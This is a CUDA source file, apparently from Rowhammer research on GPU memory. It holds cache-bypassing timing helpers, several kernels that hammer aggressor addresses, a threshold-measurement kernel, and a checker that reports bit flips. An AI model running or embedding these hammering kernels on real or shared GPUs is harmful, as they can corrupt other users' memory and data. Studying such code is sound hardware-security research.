#include <cuda_helpers.cuh>
#include <iostream>

/**
 * @brief Returns the GPU clock value in nanoseconds.
 *
 * @param time GPU clock value
 * @return uint64_t time in nanoseconds
 */
uint64_t toNS(uint64_t time)
{
  /* System variable that should be constant in a run. */
  static long double clock_rate = []()
  {
    struct cudaDeviceProp device_prop;
    cudaGetDeviceProperties(&device_prop, 0);
    std::cout << "Stable Max Clock Rate: "
              << ((long double)(device_prop.clockRate)) * 1000 << '\n';
    // std::cout << "Using Current Clock Rate: " << ((long double)(val)) <<
    // '\n';
    return ((long double)(device_prop.clockRate)) * 1000;
  }();

  // TODO: Later we might need dynamic clockRate for attack./
  return (time / clock_rate) * 1000000000.0;
}

/**
 * @brief Get the dimension of the suitable kernel for size
 *
 * @param size
 * @return std::tuple<int, int> first is Blocks and seconds is threads
 */
std::tuple<int, int> get_dim_from_size(uint64_t size)
{
  /* Constant in the system */
  static uint64_t maxThreads = []()
  {
    struct cudaDeviceProp device_prop;
    cudaGetDeviceProperties(&device_prop, 0);
    return device_prop.maxThreadsDim[2];
  }();

  /* Depending on size, dispatch dimension needed to handle the payload */
  int numBlocks = (size + (maxThreads - 1)) / maxThreads;
  int numThreads = size > maxThreads ? maxThreads : size;
  return std::make_tuple<>(numBlocks, numThreads);
}

/**
 * @brief Stores the time of uncached access of addr_access in time_arr.
 * This function requires synchronized access with __syncthreads, please
 * make sure no divergence happends on places where this function is called.
 *
 * @param addr_access address top access
 * @param time_arr place to store timing valueW
 */
__forceinline__ __device__ void
uncached_access_timing_device(uint8_t *addr_access, uint64_t *time_arr, int modifier)
{
  uint64_t temp __attribute__((unused)), clock_start, clock_end;
  asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(addr_access));
  switch (modifier)
  {
    case 0:
      clock_start = clock64();
      asm volatile("{\n\t"
                  "ld.u8.global %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_access));
      clock_end = clock64();
      break;
    case 1:
      clock_start = clock64();
      asm volatile("{\n\t"
                  "ld.u8.global.ca %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_access));
      clock_end = clock64();
      break;
    case 2:
      clock_start = clock64();
      asm volatile("{\n\t"
                  "ld.u8.global.cg %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_access));
      clock_end = clock64();
      break;
    case 3:
      clock_start = clock64();
      asm volatile("{\n\t"
                  "ld.u8.global.cs %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_access));
      clock_end = clock64();
      break;
    case 4:
      clock_start = clock64();
      asm volatile("{\n\t"
                  "ld.u8.global.cv %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_access));
      clock_end = clock64();
      break;
    case 5:
      clock_start = clock64();
      asm volatile("{\n\t"
                  "ld.u8.global.volatile %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_access));
      clock_end = clock64();
      break;
  }
  

  *time_arr = clock_end - clock_start;
  // printf("%lld\n", modifier);
}

/**
 * @brief Sets the address byte identified by the thread offset to value.
 *
 * @param addr_arr GPU address value
 * @param value 8-bit byte value
 * @param b_len maximum offset
 */
__global__ void set_address_kernel(uint8_t *addr_arr, uint64_t value,
                                   uint64_t b_len)
{
  int offset = threadIdx.x + blockIdx.x * blockDim.x;
  if (offset < b_len)
  {
    asm volatile("{\n\t"
                 "st.u8.global.wt [%0], %1;\n\t"
                 "}" ::"l"(addr_arr + offset),
                 "l"(value));
  }
}

__global__ void clear_address_kernel(uint8_t *addr, uint64_t step)
{
  for (uint64_t i = 0; i < step; i += 128)
    asm volatile("{\n\t"
                 "discard.global.L2 [%0], 128;\n\t"
                 "}" ::"l"(addr));
}

__global__ void verify_result_kernel(uint8_t **addr_arr, uint64_t target,
  uint64_t b_len, bool *has_diff)
{
  uint64_t value;

  int addr_id = (threadIdx.x + blockIdx.x * blockDim.x) / b_len;
  int byte_id = (threadIdx.x + blockIdx.x * blockDim.x) % b_len;
  asm volatile("{\n\t"
                "ld.u8.global.volatile %0, [%1];\n\t"
                "}"
                : "=l"(value)
                : "l"(*(addr_arr + addr_id) + byte_id));

  int diff_count = 0;
  int diff = target ^ value; // XOR
  for (int i = 0; i < 8; i++)
    diff_count += (diff >> i) & 1;

  if (diff_count)
  {
    if (has_diff) *has_diff = true;
    printf("Bit-Flip Location: %d bit at %p\n", diff_count, *(addr_arr + addr_id) + byte_id);
    printf("Expected Pattern: %02lx, Observed Pattern: %02lx\n", target, value);
  }
}

__global__ void evict_kernel(uint8_t *addr, uint64_t size)
{ 
  uint64_t temp, ret = 0;
  uint64_t offset = threadIdx.x * size;

  for (int i = 0 ; i < size; i += 128) {
    asm volatile("{\n\t"
               "ld.u8.global.volatile %0, [%1];\n\t"
               "}"
               : "=l"(temp)
               : "l"(addr + offset + i));
    ret += temp;
  }
  if (threadIdx.x == 0) printf("%ld\n", ret);
}


/* Just a plain old access... */
__global__ void normal_address_access(uint8_t *addr_arr, uint64_t step)
{
  uint64_t temp __attribute__((unused));
  uint64_t offset = (threadIdx.x + blockIdx.x * blockDim.x) * step;
  // printf("Offset: %d, threadID: %d, blockID: %d, blockDim: %d\n", offset, threadIdx.x, blockIdx.x, blockDim.x);

  asm volatile("{\n\t"
               "ld.u8.global.volatile %0, [%1];\n\t"
               "}"
               : "=l"(temp)
               : "l"(addr_arr + offset));
  __threadfence_block();
}

__global__ void normal_address_access_timed(uint8_t *addr_arr)
{
  uint64_t temp __attribute__((unused));
  uint64_t cs, ce;
  cs = clock64();
  asm volatile("{\n\t"
               "ld.u8.global.volatile %0, [%1];\n\t"
               "}"
               : "=l"(temp)
               : "l"(addr_arr));
  ce = clock64();
  printf("Timed victim access: %ld, %ld\n", ce - cs, temp);
}

__global__ void n_address_conflict_kernel(uint8_t **addr_arr,
                                          uint64_t *time_arr,
                                          int modifier)
{
  uncached_access_timing_device(*(addr_arr + threadIdx.x),
                                time_arr + threadIdx.x,
                                modifier);
}

__global__ void simple_hammer_kernel(uint8_t **addr_arr, uint64_t count,
                                     uint64_t *time)
{
  uint64_t temp __attribute__((unused));
  uint64_t ce, cs;
  uint8_t *addr = *(addr_arr + threadIdx.x);
  cs = clock64();
  for (; count--;)
  {
    asm volatile("{\n\t"
                 "discard.global.L2 [%0], 128;\n\t"
                 "}" ::"l"(addr));
    // clock_start = clock64();
    asm volatile("{\n\t"
                 "ld.u8.global.volatile %0, [%1];\n\t"
                 "}"
                 : "=l"(temp)
                 : "l"(addr));
    // clock_end = clock64();
    // printf("%ld, %ld\n", clock_end - clock_start, temp);
  }
  ce = clock64();
  // if (threadIdx.x == 0){
  //   printf("%ld, %ld\n", ce - cs, temp)
  //   }
  *time = ce - cs;
}

__global__ void single_thread_hammer(uint8_t **addr_arr, uint64_t count, uint64_t n, uint64_t *time)
{
  uint64_t temp __attribute__((unused));
  uint64_t ce, cs;
  cs = clock64();
  for (; count--;)
  {
    for (uint64_t i = 0; i < n; i++)
    {
      asm volatile("{\n\t"
                  "discard.global.L2 [%0], 128;\n\t"
                  "}" ::"l"(addr_arr[i]));
      asm volatile("{\n\t"
                  "ld.u8.global.volatile %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_arr[i]));
    }
  }
  ce = clock64();
  *time = ce - cs;
}

__global__ void sync_hammer_kernel(uint8_t **addr_arr, uint64_t count,
                                   uint64_t delay, uint64_t period,
                                   uint64_t *time)
{
  uint64_t temp, ret = 0, ce, cs, i;
  uint8_t *addr = *(addr_arr + threadIdx.x);
  cs = clock64();

  for (; count--;)
  {
    for (i = delay; i--;)
    {
      asm volatile("{\n\t"
                   "add.u64 %0, %1, %2;\n\t"
                   "}"
                   : "=l"(ret)
                   : "l"(ret), "l"(temp));
    }
    for (i = period; i--;)
    {
      asm volatile("{\n\t"
                   "discard.global.L2 [%0], 128;\n\t"
                   "}" ::"l"(addr));
      asm volatile("{\n\t"
                   "ld.u8.global.volatile %0, [%1];\n\t"
                   "}"
                   : "=l"(temp)
                   : "l"(addr));
    }
  }
  ce = clock64();
  *time = ce - cs;
}

__global__ void warp_simple_hammer_kernel(uint8_t **addr_arr, uint64_t count, 
                                          uint64_t n, uint64_t k, uint64_t len, 
                                          uint64_t delay, uint64_t period, 
                                          uint64_t* time)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    uint8_t *addr = *(addr_arr + threadId_in_warp + warpId * k);
    // uint8_t *addr = *(addr_arr + warpId);
    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(addr));
    if (threadIdx.x == 0)
      cs = clock64();
    __syncthreads();
    for (;count--;)
    {
      for (uint64_t i = period; i--;){
        asm volatile("{\n\t"
                    "discard.global.L2 [%1], 128;\n\t"
                    "ld.u8.global.volatile %0, [%1];\n\t"
                    "}"
                    : "=l"(temp)
                    : "l"(addr));
        __threadfence_block();
      }
      for (uint64_t i = delay; i--;){
        ret += temp;
      }
    }
    // __threadfence_block();
    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret);
             * time = ce - cs;
    }
  }
}

__global__ void rh_threshold_kernel(uint8_t **agg_arr, uint8_t **dum_arr, 
                                    uint64_t count, uint64_t n, uint64_t k, 
                                    uint64_t len, uint64_t delay, uint64_t period,
                                    uint64_t* time, 
                                    uint64_t agg_period, uint64_t dum_period)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    uint8_t *agg = *(agg_arr + threadId_in_warp + warpId * k);
    uint8_t *dum = *(dum_arr  + threadId_in_warp + warpId * k);

    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(agg));
    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(dum));

    if (threadIdx.x == 0)
      cs = clock64();
    __syncthreads();

    for (;count--;)
    {
      // Access agg
      for (uint64_t j = agg_period; j--;){
        for (uint64_t i = period; i--;){
          asm volatile("{\n\t"
                      "discard.global.L2 [%1], 128;\n\t"
                      "ld.u8.global.volatile %0, [%1];\n\t"
                      "}"
                      : "=l"(temp)
                      : "l"(agg));
          __threadfence_block();
        }
        for (uint64_t i = delay; i--;){
          ret += temp;
        }
      }
      // Access dummy
      for (uint64_t j = dum_period; j--;){
        for (uint64_t i = period; i--;){
          asm volatile("{\n\t"
                      "discard.global.L2 [%1], 128;\n\t"
                      "ld.u8.global.volatile %0, [%1];\n\t"
                      "}"
                      : "=l"(temp)
                      : "l"(dum));
          __threadfence_block();
        }
        for (uint64_t i = delay; i--;){
          ret += temp;
        }
      }
    }

    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret);
             * time = ce - cs;
    }
  }
}
